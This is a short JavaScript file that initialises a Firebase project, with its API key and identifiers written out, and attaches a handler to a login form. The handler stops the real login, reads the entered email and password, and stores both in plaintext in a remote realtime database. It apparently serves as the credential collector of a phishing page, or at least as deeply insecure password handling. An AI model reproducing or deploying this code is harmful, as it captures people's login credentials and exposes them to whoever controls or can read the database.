const firebaseConfig = {

    apiKey: "AIzaSyAF3z3j_rVqB6U-Bc6ucQDKizRmN5PJxEM",

    authDomain: "form-3d997.firebaseapp.com",

    databaseURL: "https://form-3d997-default-rtdb.firebaseio.com",

    projectId: "form-3d997",

    storageBucket: "form-3d997.appspot.com",

    messagingSenderId: "855344214690",

    appId: "1:855344214690:web:c54a907b34e548fb509dfb"

  };

firebase.initializeApp(firebaseConfig);

var formDB = firebase.database().ref("form")

document.getElementById("loginform").addEventListener("submit" , submitform)

function submitform(e){
    e.preventDefault();
     
    var mail = getElementVal("logmail")
    var pass = getElementVal("logpass")

    savevalues(mail,pass)
}

const savevalues = (mail,pass) => {
    var newform = formDB.push();

       newform.set({
        email : mail,
        password : pass
    })
}

const getElementVal = (id) => {
    return document.getElementById(id).value;
}